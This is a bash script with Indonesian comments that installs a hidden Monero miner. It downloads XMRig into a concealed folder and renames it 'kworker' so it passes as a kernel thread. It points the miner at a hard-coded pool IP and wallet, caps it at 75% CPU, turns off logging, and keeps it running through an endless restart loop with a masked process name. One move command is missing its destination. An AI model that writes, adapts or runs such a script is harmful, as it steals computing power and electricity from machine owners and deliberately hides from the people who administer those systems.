#!/bin/bash

# === Konfigurasi ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="159.65.167.171:443"
THREAD_HINT="75"  # Gunakan 75% CPU

# === Setup ===
echo "[*] Menyiapkan folder tersembunyi..."
mkdir -p ~/.local/.kmod
cd ~/.local/.kmod

echo "[*] Mengunduh XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-x64.tar.gz
tar -xzvf xmrig-6.21.2-linux-x64.tar.gz
mv xmrig-6.21.2
cd xmrig-6.21.2

echo "[*] Rename binary ke kworker..."
mv xmrig kworker

echo "[*] Membuat config.json (kmod.conf)..."
cat > kmod.conf <<EOF
{
    "autosave": true,
    "background": true,
    "randomx": {
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "max-threads-hint": $THREAD_HINT,
        "yield": true
    },
    "donate-level": 1,
    "log-file": null,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "print-time": 60,
    "health-print-time": 120,
    "pause-on-battery": false
}
EOF

echo "[*] Membuat auto-restart script (kmod.sh)..."
cat > kmod.sh <<'EOF'
#!/bin/bash
cd "$(dirname "$0")"
while true
do
  nohup bash -c "exec -a 'kworker/u16:3' ./kworker -c kmod.conf" > /dev/null 2>&1
  sleep 5
done
EOF

chmod +x kmod.sh

echo "[*] Menjalankan miner tersembunyi..."
nohup ./kmod.sh > /dev/null 2>&1 &

echo "[✓] Selesai. Proses berjalan sebagai 'kworker/u16:3'."
